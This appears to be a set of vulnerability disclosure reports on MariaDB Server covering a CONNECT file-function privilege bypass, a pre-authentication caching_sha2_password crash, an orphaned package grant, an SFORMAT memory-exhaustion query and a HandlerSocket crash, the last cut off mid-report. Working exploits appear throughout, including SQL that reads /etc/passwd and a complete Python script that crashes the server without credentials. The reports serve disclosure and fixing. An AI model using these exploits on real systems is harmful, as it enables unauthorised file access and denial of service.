title: Missing FILE-privilege enforcement in CONNECT file UDFs allows server-side file read and write

asset.asset_identifier: MariaDB Server & Connectors - Access control bypass

vulnerability_information:
## Summary

- **What the bug lets you do.** With only `SELECT` privilege, read any file MariaDB can read (for example `/etc/passwd`, `my.cnf`, TLS private keys) and write files as the `mysql` OS user anywhere the process can write.
- **Why that should not work.** Reading files from SQL normally requires the `FILE` privilege, and file paths are confined to `secure_file_priv`.
- **What is missing.** CONNECT's file UDFs (`json_file`, `bson_file`, `jfile_make`, `bfile_make`, `jbin_file`) check neither `FILE` nor `secure_file_priv`.
- **How we know it is a mistake, not a design choice.** The same CONNECT engine already enforces both checks on its file-backed *tables* (`ha_connect.cc:4538/4557/4559`). Only the UDF entry points were left ungated.
- **Where it was reproduced.** MariaDB 12.3.2 GA (current Stable, what `mariadb:latest` pulls); the cited files are byte-identical on `mariadb-13.0.1-rc` and on `main`.

## The attack

**Setup.** The server is started with `--secure-file-priv=/tmp`, so file access is meant to be confined to `/tmp`. User `plain` has `SELECT` on one schema and no `FILE`.

**Step 1 — the normal way is blocked, as expected:**

```sql
SELECT LOAD_FILE('/tmp/secret.json');   -- NULL: plain has no FILE privilege
SELECT LOAD_FILE('/etc/passwd');        -- NULL: outside secure_file_priv (even a FILE user is blocked here)
```

**Step 2 — the same user reads any file via the CONNECT UDF:**

```sql
SELECT json_file('/etc/passwd');
-- returns: root:x:0:0:root:/root:/bin/bash ...

SELECT json_file('/tmp/secret.json');
-- returns: {"connect-udf-lab-secret":"..."}
```

**Step 3 — the same user writes a file outside `secure_file_priv`, as the `mysql` OS user:**

```sql
SELECT jfile_make('{"written":"plain-user"}',
                  '/var/lib/mysql/connect_udf_written.json', 0);
-- creates the file (outside /tmp), owned mysql:mysql
```

**Net effect.** `FILE` and `secure_file_priv` become unenforceable against any user who can call these UDFs.

## Details

1. **The CONNECT table handler already gates file access with `FILE` and `secure_file_priv`; the file UDFs bypass both.**
   - `storage/connect/ha_connect.cc` guards `FILE_NAME` table options at:
     - [`:4538`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/ha_connect.cc#L4538) `is_secure_file_path(path)`
     - [`:4557`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/ha_connect.cc#L4557) and [`:4559`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/ha_connect.cc#L4559) `check_global_access(thd, FILE_ACL)`
   - The file UDFs open paths through the same engine with neither check.
   - The table handler already enforces both — the check exists, it just wasn't wired into the UDFs.

2. **Read sinks in the UDFs reach the filesystem without any privilege gate.**
   - `json_file` read ([`jsonudf.cpp:1587`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1587) `GetFileLength`, [`:1904`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1904) `GetJsonFile`), reached from the UDF body at [`:1636`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1636) and [`:1690`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L1690).
   - `bson_file` read ([`bsonudf.cpp:4422`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4422) `bson_file_init` → [`:4450`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4450) `GetFileLength(args->args[0])`; [`:4517`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4517) `GetJsonFile`).
   - `jbin_file` read ([`jsonudf.cpp:5763`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L5763) `jbin_file_init` → [`:5789`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L5789) `GetFileLength(args->args[0])`).
   - No call to `check_global_access(thd, FILE_ACL)` or `is_secure_file_path()` precedes any of them. Confirmed by `grep -niE 'FILE_ACL|is_secure_file_path|secure_file_priv|check_global_access' jsonudf.cpp bsonudf.cpp` returning zero hits.

3. **Write sinks in `jfile_make` and `bfile_make` serialize to caller-supplied paths with the same gap.**
   - `jfile_make` write: [`jsonudf.cpp:4718`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/jsonudf.cpp#L4718) `Serialize(g, jvp->GetJson(), fn, pretty)`.
   - `bfile_make` write: [`bsonudf.cpp:4559`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4559) → [`:4632`](https://github.com/MariaDB/server/blob/mariadb-12.3.2/storage/connect/bsonudf.cpp#L4632) `bnx.Serialize(g, jvp, fn, pretty)`.

4. **The write primitive does not reach OS code execution on a standard installation.**
   - Writing into `plugin_dir` fails on OS permissions (`mysql` does not own `plugin_dir`).
   - The UDF loader rejects path separators and resolves only basenames from `plugin_dir`.
   - Impact is file read and write, not RCE.

## Triage note — CVE-2024-27766 distinction

MariaDB disputed CVE-2024-27766 on the grounds that "no privilege boundary is crossed" and "registration is an admin act." This finding is different on both points:

- CVE-2024-27766 required `FILE` privilege plus write access to `plugin_dir`. This finding bypasses `FILE` entirely — the attacker needs only `SELECT`.
- CVE-2024-27766 did not implicate `secure_file_priv`. This finding defeats `secure_file_priv` that the same CONNECT engine enforces on its own table path (ha_connect.cc:4538/4557/4559). The admin registered UDFs that discard a control the engine itself treats as mandatory elsewhere.

The asymmetry is the bug. An admin registering the UDFs as file-access helpers could reasonably expect them to respect the same `FILE` and `secure_file_priv` policy the engine applies to file-backed tables. They don't.

## Patches

1. Apply CONNECT's existing table-path policy to all file UDFs — require `FILE` and enforce `secure_file_priv` before opening or writing any path. This covers `json_file`, `bson_file`, `jfile_make`, `bfile_make`, and `jbin_file`, and any future `_file`-variant UDF.

```cpp
// Add to each file-UDF *_init function, before GetFileLength / GetJsonFile / Serialize:
THD *thd = current_thd;
if (check_global_access(thd, FILE_ACL)) {
    strcpy(message, "FILE privilege required");
    return 1;
}
char real_path[FN_REFLEN];
// Canonicalize first so ../sequences don't bypass the check below:
my_realpath(real_path, args->args[0], MYF(0));
if (!is_secure_file_path(real_path)) {
    strcpy(message, "path outside secure_file_priv");
    return 1;
}
```

   Note: `is_secure_file_path` is currently a file-static helper in `ha_connect.cc`. The cleanest fix moves it (or a minimal equivalent using `opt_secure_file_priv` from `mysqld.h`) to a shared header so all UDF init functions can call it without duplication. This is consistent with what MDEV-13353 did for additional table types.

2. Document that these UDFs read and write server-side files, so operators know registering them requires FILE-equivalent trust — it should be stated explicitly in the CONNECT KB page for `json_file` and `jfile_make`.

## Reproduction

1. Start MariaDB 12.3.2 with `--secure-file-priv=/tmp` (pass it as a `mysqld` command-line flag, e.g. `docker run mariadb:12.3.2 --secure-file-priv=/tmp`).

   Install the CONNECT plugin package on the server host — `apt-get update && apt-get install -y mariadb-plugin-connect` (Debian/Ubuntu) or `mariadb-connect-engine` (RHEL/Rocky). The `apt-get update` is required on the official `mariadb:` Docker image, which ships with a stale apt cache. The SQL `INSTALL SONAME 'ha_connect'` in step 2 loads the plugin from that package; both steps are required.

2. As a DBA account, load and register the UDFs:

```sql
INSTALL SONAME 'ha_connect';

CREATE FUNCTION json_file  RETURNS STRING  SONAME 'ha_connect.so';
CREATE FUNCTION jfile_make RETURNS STRING  SONAME 'ha_connect.so';
```

3. Create a low-privilege test account and a target file:

```sql
CREATE DATABASE testdb;
CREATE USER 'plain'@'%' IDENTIFIED BY 'test';
GRANT SELECT ON testdb.* TO 'plain'@'%';
-- 'plain' has USAGE + SELECT only; no FILE.
```

```bash
echo '{"connect-udf-lab-secret":"topsecret"}' > /tmp/secret.json
```

4. As `plain`, verify the built-in path is blocked:

```sql
SELECT LOAD_FILE('/tmp/secret.json') IS NULL AS load_file_denied;
-- expect: 1 (NULL — plain lacks FILE)
```

5. As `plain`, call the UDF read path:

```sql
SELECT json_file('/etc/passwd');         -- expect: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...` (returned as one backslash-escaped string; non-JSON input is not rejected)
SELECT json_file('/tmp/secret.json');    -- expect: {"connect-udf-lab-secret":"topsecret"}
```

6. As `plain`, call the UDF write path (the UDF returns the path string on success — no row count, no boolean; verify via `ls` afterwards):

```sql
SELECT jfile_make('{"written":"plain-user"}',
                  '/var/lib/mysql/connect_udf_written.json', 0);
-- returns: /var/lib/mysql/connect_udf_written.json
```

```bash
ls -la /var/lib/mysql/connect_udf_written.json
# expect: -rw-rw---- mysql mysql 25 ... (file exists outside /tmp)
cat /var/lib/mysql/connect_udf_written.json
# expect: {"written":"plain-user"}
```

## Impact

- Confidentiality: read any file the server process can access — credentials in config files, TLS private keys, system files (#2).
- Integrity: write attacker-controlled JSON to any path `mysql` can write, outside `secure_file_priv` (#3).
- Bypasses the `FILE` privilege and `secure_file_priv` boundary that confines SQL file access (#3).

title: Pre-authentication `size_t` integer underflow → out-of-bounds read / server crash in MariaDB `caching_sha2_password` (auth_mysql_sha2) via an RSA-OAEP

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
### Summary
The `caching_sha2_password` server plugin, on a plaintext TCP connection, RSA-decrypts the client's password reply and sets `pkt_len = (int)plain_text_len` without checking for an empty plaintext. It then calls `sha256_crypt_r(pkt, pkt_len - 1, ...)` where the second parameter is `size_t`. An unauthenticated attacker who RSA-OAEP-encrypts a zero-length message with the server's public key makes `plain_text_len == 0`, so `pkt_len - 1` underflows to `SIZE_MAX`; the SHA-256 routine then reads `SIZE_MAX` bytes from a small stack buffer, causing an out-of-bounds read and SIGSEGV that crashes the entire server. The crash occurs during password verification, before any credential comparison, so no valid password is needed.

### Root Cause
`plugin/auth_mysql_sha2/mysql_sha2.c` (server `auth()`):
```c
unsigned char plain_text[1025];
size_t plain_text_len = sizeof(plain_text) - 1;
...
if (vio_info.protocol == MYSQL_VIO_TCP && !vio_info.tls) {     // plaintext TCP + RSA keys
    ...                                                        // (server serves public key on request '\2')
    if (ssl_decrypt(private_key, pkt, pkt_len, plain_text, &plain_text_len))  // OAEP; sets len=0 for empty msg
        return CR_ERROR;
    for (size_t i=0; i < plain_text_len; i++) plain_text[i]^= scramble[i % SCRAMBLE_LENGTH];
    pkt = plain_text;
    pkt_len = (int)plain_text_len;                             // attacker-controlled -> 0
}
authstr = (struct digest*)info->auth_string;
sha256_crypt_r(pkt, pkt_len-1, authstr->salt, sizeof(authstr->salt), to, authstr->iterations);  // 0-1 -> (size_t)-1
```
`sha256_crypt_r(const char *key, size_t key_len, ...)` in `plugin/auth_mysql_sha2/sha256crypt.c`:
```c
unsigned char *p_bytes = my_safe_alloca(key_len);             // my_malloc(SIZE_MAX) -> NULL
my_sha256_multi(alt, key, key_len, salt, salt_len, key, key_len, NULL);  // reads key_len=SIZE_MAX bytes -> OOB
```
`ssl_decrypt` uses `RSA_PKCS1_OAEP_PADDING` and faithfully returns `dstlen = 0` for an OAEP-encrypted empty message, so `plain_text_len` becomes 0. There is no `pkt_len <= 0` / `plain_text_len == 0` guard before the `pkt_len - 1` subtraction.

### Steps To Reproduce
Prerequisites (normal MySQL-compatibility config — `caching_sha2_password` in use over plaintext TCP, RSA keys present):
1. Load the plugin: `INSTALL SONAME 'auth_mysql_sha2';`
2. Restart the server so the plugin is loaded at startup and its RSA keys auto-generate (`caching_sha2_password_auto_generate_rsa_keys=ON` by default → `private_key.pem`/`public_key.pem` are created in the data directory). The keys are NOT generated by a runtime `INSTALL`, so this restart is required.
3. Create an account that authenticates via the plugin, with a password set (do this after step 2 so a valid hash is stored): `CREATE USER sha2u@'%' IDENTIFIED VIA caching_sha2_password USING PASSWORD('secret123');` — confirm with `SHOW CREATE USER sha2u@'%';` (must show a non-empty `USING '$A$005$…'` hash).

Then, as an UNAUTHENTICATED network client (no valid password), drive the `caching_sha2_password` full-auth exchange over plaintext TCP and, at the final step, send an RSA-OAEP encryption of an EMPTY message instead of an encrypted password (a ~30-line raw-protocol script is provided: `poc/poc_sha2_min.py`, requires Python `cryptography`). In outline: connect → declare user `sha2u` (→ server AuthSwitch to `caching_sha2_password`) → send a 32-byte first reply (passes the `pkt_len == SHA256_DIGEST_LENGTH` gate) → server replies `perform_full_authentication` → request the public key → send `OAEP(b"")`. This makes `plain_text_len == 0`, so `pkt_len - 1` underflows to `SIZE_MAX`.

Observed live (official `mariadb:12.3.2`):
```
260603 19:27:08 [ERROR] mariadbd got signal 11 ;
  ... libcrypto SHA256_Update+0x12e
  my_sha256_multi+0xee
  auth_mysql_sha2.so(sha256_crypt_r+0x1db)
  acl_authenticate ... do_handle_one_connection ... handle_one_connection
```
Container state: `Exited (139)` (= 128+SIGSEGV; OOMKilled=false). The whole server is down for all clients; it recovers only on restart.

In details

```bash
# 1. start MariaDB 12.3.2, wait until ready
docker rm -f mariadb 2>/dev/null
docker run -d --name mariadb -e MARIADB_ROOT_PASSWORD=root -p 127.0.0.1:13306:3306 mariadb:latest
until docker exec mariadb mariadb -uroot -proot -e "SELECT 1" >/dev/null 2>&1; do sleep 2; done

# 2. install the plugin
docker exec mariadb mariadb -uroot -proot -e "INSTALL SONAME 'auth_mysql_sha2';"

# 3. RESTART so the plugin loads at startup -> auto-generates the RSA keys
docker restart mariadb
until docker exec mariadb mariadb -uroot -proot -e "SELECT 1" >/dev/null 2>&1; do sleep 2; done
docker exec mariadb sh -c 'ls /var/lib/mysql/*.pem' # must show private_key.pem + public_key.pem

# 4. NOW create the user (plugin healthy -> hash is stored correctly)
docker exec mariadb mariadb -uroot -proot -e \
"CREATE USER sha2u@'%' IDENTIFIED VIA caching_sha2_password USING PASSWORD('secret123');"
docker exec mariadb mariadb -uroot -proot -e "SHOW CREATE USER sha2u@'%';" # must show ... USING '\$A\$005\$...'(non-empty hash)

# 5. fire the PoC (unauthenticated, no password) and confirm the crash
docker exec mariadb mariadb -uroot -proot -e "SELECT 'UP_BEFORE' s;"
python3 poc/poc_sha2_min.py # -> [+] connection died after ciphertext (= SIGSEGV)
docker inspect mariadb --format 'exit={{.State.ExitCode}}'# -> exit=139

```

With `poc_sha2_min.py`

```python
#!/usr/bin/env python3
# MariaDB caching_sha2_password pre-auth DoS (size_t underflow), minimal PoC.
# Sends an RSA-OAEP encryption of an EMPTY message -> server computes
# sha256_crypt_r(pkt, pkt_len-1 = SIZE_MAX) -> my_sha256_multi OOB read -> SIGSEGV.
# Precondition: target has a caching_sha2_password account; plaintext TCP; RSA keys (auto-generated by default).
# No valid password required (crash happens before credential comparison).
import socket, struct
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization

s = socket.create_connection(("127.0.0.1", 13306))                 # 1. connect to MariaDB

def recv():                                                        #    read one packet: [3B length][1B seq][payload]
    h = s.recv(4)
    if len(h) < 4: raise EOFError("server closed early (setup issue: sha2u needs a valid "
                                  "caching_sha2_password hash AND RSA keys must exist)")
    n = h[0] | h[1] << 8 | h[2] << 16; return h[3], s.recv(n)
def send(seq, body):                                               #    send one packet with the given sequence number
    s.sendall(struct.pack("<I", len(body))[:3] + bytes([seq & 255]) + body)

seq, _ = recv()                                                    # 2. read the server handshake
caps = 1 | 0x200 | 0x8000 | 0x80000                                #    LONG_PASSWORD|PROTOCOL_41|SECURE_CONN|PLUGIN_AUTH
hsr  = struct.pack("<IIB", caps, 0xFFFFFF, 45) + b"\x00"*23 \
       + b"sha2u\x00" + b"\x00" + b"mysql_native_password\x00"     #    declare user 'sha2u', empty auth response
send(seq + 1, hsr)                                                 # 3. -> server issues AuthSwitch to caching_sha2_password

seq, _ = recv()                                                    # 4. read AuthSwitchRequest
send(seq + 1, b"A" * 32)                                           # 5. send exactly 32 bytes (passes the pkt_len==SHA256_DIGEST_LENGTH gate)

seq, _ = recv()                                                    # 6. server replies \x04 (perform_full_authentication)
send(seq + 1, b"\x02")                                             # 7. request the RSA public key (request_public_key)

seq, p = recv()                                                    # 8. server returns the public key (0x01-prefixed)
pub = serialization.load_pem_public_key(p[1:] if p[:1] == b"\x01" else p)
ct  = pub.encrypt(b"", padding.OAEP(                               # 9. *** RSA-OAEP encryption of an EMPTY message ***
        mgf=padding.MGF1(hashes.SHA1()), algorithm=hashes.SHA1(), label=None))
send(seq + 1, ct)                                                  # 10. send -> plain_text_len=0 -> pkt_len-1=SIZE_MAX -> crash

try: recv(); print("server replied — NO crash (unexpected)")
except Exception as e: print(f"[+] connection died after ciphertext: {e!r}  (= server SIGSEGV)")
```

### Remediation
In `mysql_sha2.c auth()`, reject an empty/short decrypted reply before the subtraction, e.g. `if (pkt_len < 1) return CR_ERROR;` after the decrypt block (and after the non-RSA `read_packet`). Defensively, make `sha256_crypt_r` treat `key_len == 0` safely. Add a regression test that sends an OAEP-encrypted empty message to a `caching_sha2_password` account.

## Impact

Any network client that can reach port 3306 crashes the entire MariaDB instance with a single connection and no valid credentials, as long as some account uses `caching_sha2_password` (typical for MySQL-compatible deployments) and TLS is not enforced on the connection. Full denial of service for all clients; trivially repeatable.

title: DROP PACKAGE leaves PACKAGE BODY grant in mysql.procs_priv causing privilege escalation

asset.asset_identifier: MariaDB Server & Connectors - Access control bypass

vulnerability_information:
# Vulnerability Description

`DROP PACKAGE` removes both `mysql.proc` rows but only the `PACKAGE` row from `mysql.procs_priv`, leaving the `PACKAGE BODY` grant orphaned. Since `PACKAGE BODY` is the type that gates execution, a package later created under the same name is executable by the old grantee without any grant on it, running with the new definer's privileges.

## Affected Version

Reproduced on MariaDB 12.3.2 (`12.3.2-MariaDB-ubu2404`), the current release, in the official `mariadb:latest` container. Packages require `sql_mode=ORACLE`.

## Why This is an Oversight Rather Than Intended Behaviour

Every sibling drop statement removes its grant row. Only `DROP PACKAGE` does not. Run in one batch with identical setup, four objects each granted `EXECUTE` to the same user:

```
=== grants before drops ===
Routine_name    Routine_type
c_func          FUNCTION
c_pkg           PACKAGE BODY
c_pkgbody       PACKAGE BODY
c_proc          PROCEDURE

=== grants after drops ===
Routine_name    Routine_type    Proc_priv
c_pkg           PACKAGE BODY    Execute
```

`DROP PROCEDURE`, `DROP FUNCTION` and `DROP PACKAGE BODY` all cleaned up. `DROP PACKAGE` did not.

The surviving row is also the consequential one. `DROP PACKAGE` cascades and deletes both `mysql.proc` rows (the `PACKAGE` and the `PACKAGE BODY`), but in `mysql.procs_priv` it removes only the `PACKAGE` row and leaves the `PACKAGE BODY` row, which is the type that actually gates execution.

## Reproduction Steps

Full script attached as `poc_drop_package.sql`. Abbreviated:

```sql
SET sql_mode=ORACLE;
USE appdb;

DELIMITER $$
CREATE PACKAGE kvchk AS FUNCTION f RETURN VARCHAR2(64); END$$
CREATE PACKAGE BODY kvchk AS FUNCTION f RETURN VARCHAR2(64) AS BEGIN RETURN 'benign'; END; END$$
DELIMITER ;
GRANT EXECUTE ON PACKAGE BODY appdb.kvchk TO 'reader'@'%';

DROP PACKAGE kvchk;
```

State immediately after the drop. The object is gone, the authorisation is not:

```
=== mysql.proc rows after DROP PACKAGE ===
proc_rows
0

=== mysql.procs_priv after DROP PACKAGE ===
Db      User    Routine_name    Routine_type    Proc_priv
appdb   reader  kvchk           PACKAGE BODY    Execute
```

Then a new package takes the name, created by root, reading a table `reader` has no privilege on. `reader` is granted nothing on it:

```sql
DELIMITER $$
CREATE PACKAGE kvchk AS FUNCTION f RETURN VARCHAR2(64); END$$
CREATE PACKAGE BODY kvchk AS FUNCTION f RETURN VARCHAR2(64) AS
  v VARCHAR2(64);
BEGIN SELECT secret INTO v FROM vault WHERE id=1; RETURN v; END; END$$
DELIMITER ;
```

Result, verbatim, both halves of the control:

```
reader> SELECT * FROM vault;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table `appdb`.`vault`

reader> SET sql_mode=ORACLE; SELECT kvchk.f() AS leaked;
leaked
HUNT-VAULT-9f3a2c71
```

`HUNT-VAULT-9f3a2c71` is a marker planted in the protected table, so the leak is a fact rather than an inference.

The grants `reader` actually holds at that moment contain no package privilege of any kind:

```
GRANT USAGE ON *.* TO `reader`@`%`
GRANT SELECT ON `appdb`.`public_notes` TO `reader`@`%`
GRANT SELECT ON `appdb`.`v_vault_definer` TO `reader`@`%`
GRANT EXECUTE ON PROCEDURE `appdb`.`p_vault_definer` TO `reader`@`%`
GRANT EXECUTE ON FUNCTION `appdb`.`f_vault_secret` TO `reader`@`%`
```

## It Also Propagates Through Roles

Granting the same `EXECUTE ON PACKAGE BODY` to a role rather than a user leaves an identical orphan. Every current and future member of that role, including members that hold it only through a nested role, inherits execution on whatever later takes the name.

## Suggested Fix

Make `DROP PACKAGE` delete both `mysql.procs_priv` rows for the name: the `PACKAGE` row and the `PACKAGE BODY` row, matching what `DROP PACKAGE BODY` already does for its own row. The cascade is already correct in `mysql.proc`; the same cascade is missing on the privilege table.

## Limitations

* This is not attacker-triggered. It needs an administrator to drop a package and later create one of the same name with a more privileged definer. That is the normal deployment pattern for packages, but the attacker does not cause it.
* `SHOW GRANTS` does display the stale grant, so an administrator auditing privileges can discover it. It is silent in the sense that nothing warns at drop time and nothing warns when the name is reused.
* I also observed that `DROP DATABASE` leaves routine grants behind, but that is long-standing documented MySQL and MariaDB behaviour and it drops the `PROCEDURE` rows too, so I am explicitly not claiming it as part of this report.

Everything above was run locally against the official container. No MariaDB system was contacted.

## AI Tooling Disclosure

I used an AI assistant while exploring this and while drafting this report. Every statement quoted here was executed by me against the local container and every output block is copied verbatim from those runs, including the contrast controls.

## Impact

A user who was once granted `EXECUTE ON PACKAGE BODY` keeps that grant after the package is dropped. If a package with the same name is created later, that user can execute it without ever being granted anything on it, and the package runs with its definer's privileges. Where the new package is more privileged than the old one, this is a privilege escalation that reads data the user cannot otherwise reach.

## Demonstrated Impact

In the reproduction lab: `reader` is refused the protected table outright:

```
reader> SELECT * FROM vault;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table `appdb`.`vault`
```

After an unrelated package named `kvchk` is dropped and a new `kvchk` is created by root, the same user reads that table through it, holding no grant on the new object:

```
reader> SET sql_mode=ORACLE; SELECT kvchk.f();
kvchk.f()
HUNT-VAULT-9f3a2c71
```

Drop-and-recreate under a stable name is the ordinary way packages are deployed, so the two halves occur naturally rather than needing to be engineered.

## Security Implications

* **Privilege Escalation**: Users can execute packages they have no authorization for
* **Data Exfiltration**: Protected data can be accessed through the recreated package running with elevated privileges
* **Role Propagation**: The vulnerability propagates through roles to all current and future members
* **Silent Exploitation**: No warnings at drop time or when the name is reused; only visible through `SHOW GRANTS` auditing

title: MariaDB Low-Privilege User Can Exhaust Memory Through a Formatting Function and Crash the Service

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
### Product

Product name: MariaDB Server

Product link: https://github.com/MariaDB/server

Affected versions: Reproduced in a locally built test environment based on the official MariaDB source code, running `13.1.0-MariaDB`. `SFORMAT()` has been available since MariaDB 10.7. The final affected version range should be confirmed by the vendor.

### Summary

MariaDB's built-in `SFORMAT()` function supports string formatting. A low-privilege database user can pass an extremely large width parameter, causing the server to attempt to allocate very large memory before generating the return value.

The attacker does not need administrative privileges. The attacker only needs a database account that can log in and execute an ordinary `SELECT`. Multiple concurrent requests can cause `mariadbd` to be terminated by the system OOM mechanism, making the database service unavailable.

The current evidence only proves denial-of-service risk. It does not prove information disclosure, privilege escalation, or remote code execution.

### Details

`SFORMAT()` generates a result according to a format string. For example:

```sql
SELECT SFORMAT('{:10}', 'x');
```

Normally, this formats `x` using the specified width.

The issue is that the function allows users to specify a very large width, for example:

```sql
SELECT LENGTH(SFORMAT('{:2147483647}', 'x'));
```

Even when the call is wrapped in `LENGTH()`, the server still needs to generate the full formatted string before calculating its length. Therefore, before the result is returned to the client, `mariadbd` already attempts to allocate close to 2 GB of memory.

MariaDB has a parsing limit for larger numbers. For example, a width greater than `2147483647` returns an error. However, `2147483647` itself is still accepted and is already enough to cause severe memory consumption. Network result-size limits such as `max_allowed_packet` do not prevent this because the memory allocation occurs before the result-size check.

### Preconditions

Exploitation requires the following conditions:

- The attacker has a low-privilege MariaDB account that can log in over TCP.
- The account can execute ordinary `SELECT`.
- The target version provides the `SFORMAT()` function.
- The database process does not have enough available memory to withstand multiple oversized formatting requests.

No table privilege, file privilege, administrator privilege, or user interaction is required.

### PoC

Reproduction materials are in the `poc/` directory:

- `poc/README.md`
- `poc/Dockerfile.mariadb-source`
- `poc/build-local-image.sh`
- `poc/run-local-target.sh`
- `poc/run-poc.sh`
- `poc/record-poc-demo.sh`
- `poc/poc.mp4`

The reproduction environment uses a locally source-built image:

```text
mariadb-source-sformat:13.1-preview
```

Run:

```bash
cd poc
chmod +x *.sh
./build-local-image.sh
./run-local-target.sh
./run-poc.sh
```

The PoC starts a temporary MariaDB container with a memory limit, creates a low-privilege account with only `USAGE`, and then executes `SFORMAT()` through an authenticated TCP connection.

The key trigger statement is:

```sql
SELECT LENGTH(SFORMAT('{:2147483647}', 'x'));
```

The PoC sends multiple concurrent requests with the statement above. When the vulnerability exists, expected output includes:

```text
AUTHENTICATED_LOW_PRIVILEGE_TCP=ok
SFORMAT_LOW_PRIVILEGE=ok
SERVER_AFTER_STRESS=down
RESULT: VULNERABLE_CONFIRMED
```

`poc/poc.mp4` is an end-to-end screen recording. It shows local source-image checks, low-privilege TCP authentication, concurrent service crash triggering, container recovery, and `date -R` time information at the end of the recording.

### Score

CVSS 3.1 score: 6.5, Medium.

```text
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
```

CVSS 3.1 scoring rationale:

- AV:N: The attacker sends SQL through a network database connection.
- AC:L: Exploitation is fixed and does not require a race condition, memory layout control, or special timing.
- PR:L: A low-privilege database account that can execute ordinary SQL expressions is required.
- UI:N: No user interaction is required.
- S:U: The impact is limited to the attacked MariaDB service process.
- C:N / I:N: The current evidence does not prove data disclosure or data tampering.
- A:H: Concurrent oversized formatting requests can cause `mariadbd` to be terminated by the OOM mechanism, making the database service unavailable.

CWE: CWE-789 (Memory Allocation with Excessive Size Value)

### Credit

This vulnerability was discovered by:

- XlabAI Team of Tencent Xuanwu Lab (xlabai@tencent.com)
- Atuin Automated Vulnerability Discovery Engine
- Guannan Wang (wgnbuaa@gmail.com), Zhanpeng Liu (pkugenuine@gmail.com), Jiashuo Liang (761232680@qq.com), Guancheng Li (lgcpku@gmail.com)

CVE and credits are preferred.

If you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is xlabai@tencent.com.

### Note

Note that we follow the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.

## Impact

An attacker with a low-privilege database account can use ordinary SQL requests to exhaust server-side memory, causing the database process to crash or be terminated by the system.

Impact boundaries:

- The issue can interrupt the database service.
- It does not require access to any business table.
- It does not require administrator privileges.
- The current evidence does not prove sensitive data disclosure.
- The current evidence does not prove remote code execution.

title: MariaDB HandlerSocket Improper Request Field-Count Validation Causes Server Crash

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
### Product

Product name: MariaDB Server

Product link: https://github.com/MariaDB/server

Affected versions: Reproduced in a locally built test environment based on the official MariaDB source code, running `13.1.0-MariaDB`. HandlerSocket is an optional MariaDB plugin. The final affected version range should be confirmed by the vendor.

### Summary

HandlerSocket is an optional MariaDB plugin that exposes a separate port for direct table index access similar to key-value queries, bypassing normal SQL parsing to improve performance for simple read/write operations.

When HandlerSocket is enabled, MariaDB accepts client requests through the HandlerSocket port. The exec request contains a "field count" parameter. The code uses that count to allocate stack memory and write field records before checking whether the count is reasonable. An attacker can send an abnormally large field count, causing the `mariadbd` process to crash and making the database service unavailable.

If HandlerSocket is enabled and `handlersocket_plain_secret` / `handlersocket_plain_secret_wr` is not configured, the issue can be triggered by an unauthenticated attacker. If a secret is configured, the attacker must authenticate to HandlerSocket first. The current evidence only proves denial of service. It does not prove code execution or data theft.

### Details

A HandlerSocket exec request roughly contains a prepared statement number, operator, field count, and field values. After the affected code reads the client-controlled field count `fldnum`, it immediately executes logic similar to the following:

```cpp
fldnum = read_field_count_from_request();
flds = alloca(fldnum * sizeof(string_ref));
for each field:
    flds[i] = string_ref(field_pointer, field_length);
```

The issue is the validation order. The program should first confirm that `fldnum` does not exceed the number of fields allowed by the index, and only then allocate memory. Instead, it allocates stack memory based on the client-supplied count and writes into it before the later field-count validation runs.

When an attacker sets the field count to a very large value, the program attempts to allocate an abnormally large stack buffer. In verification, `1000000000` was used as the field count. `mariadbd` triggered SIGSEGV and exited while writing the first field record.

This is not a normal SQL-port vulnerability. Only deployments that enable the HandlerSocket plugin and expose a HandlerSocket listener are affected. The PoC directory provides a way to build a local test image from the official MariaDB source. The container loads the HandlerSocket plugin and exposes the listener port at startup.

### PoC

Reproduction materials are in the `poc/` directory:

- `poc/README.md`
- `poc/Dockerfile.mariadb-source`
- `poc/build-local-image.sh`
- `poc/run-local-target.sh`
- `poc/record-poc-demo.sh`
- `poc/poc.py`
- `poc/run-poc.sh`
- `poc/poc.mp4`

Reproduction environment:

```bash
cd poc
chmod +x *.sh docker-entrypoint-hs.sh
./build-local-image.sh
./run-local-target.sh
```

By default, the image shallow-clones the official MariaDB repository `https://github.com/MariaDB/server.git` from the `preview-13.1-preview` branch and verifies that the current HEAD is fixed at commit `91f37a32f3ee463bdb8287ef951170b5f64201e0`. To reproduce against another official source tag or branch, use:

```bash
cd poc
MARIADB_REF='<official-tag-or-branch>' MARIADB_EXPECTED_COMMIT='' ./build-local-image.sh
./run-local-target.sh
```

After the target container starts, it satisfies the following conditions:

1. MariaDB has loaded the HandlerSocket plugin.
2. The HandlerSocket read or write listener port is reachable.
